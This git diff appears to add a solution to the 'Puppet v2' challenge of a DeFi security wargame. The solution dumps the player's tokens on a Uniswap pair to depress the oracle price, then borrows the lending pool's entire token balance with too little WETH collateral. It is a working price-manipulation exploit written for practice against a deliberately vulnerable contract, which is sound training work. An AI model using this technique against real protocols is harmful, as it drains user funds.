@@ -82,7 +82,42 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+      let reservesWETH = await lendingPool.getReservesWETH();
+      let reservesToken = await lendingPool.getReservesToken();
+      console.log(`Reserves before: WETH: ${reservesWETH} Token: ${reservesToken}`);
+      const ROUTER = uniswapRouter.address;
+      await token.connect(player).approve(
+        ROUTER,
+        PLAYER_INITIAL_TOKEN_BALANCE 
+      );
+      let result = await uniswapRouter.connect(player)
+            .swapExactTokensForTokens(
+                PLAYER_INITIAL_TOKEN_BALANCE,
+                1,
+                [token.address, weth.address],
+                player.address,
+                (await ethers.provider.getBlock('latest')).timestamp * 2
+            );
+      reservesWETH = await lendingPool.getReservesWETH();
+      reservesToken = await lendingPool.getReservesToken();
+      console.log(`Reserves after: WETH: ${reservesWETH} Token: ${reservesToken}`);
+      let wethValue = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+      console.log(`WETH deposit required: `, wethValue);
+      let wethBalance = await weth.connect(player).balanceOf(player.address);
+      console.log(`WETH balance of player`, wethBalance);
+      await weth.connect(player).deposit({ value: PLAYER_INITIAL_ETH_BALANCE - 5n*10n**16n });
+      wethBalance = await weth.connect(player).balanceOf(player.address);
+      console.log(`WETH balance of player`, wethBalance);
+      const depositRequired = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+      console.log(`Deposit required: ${depositRequired}`);
+      if (depositRequired > wethBalance) {
+        console.log('Insufficient balance of WETH');
+      } else {
+        console.log('Player has enough WETH');
+      }
+
+      await weth.connect(player).approve(lendingPool.address, wethBalance);
+      await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
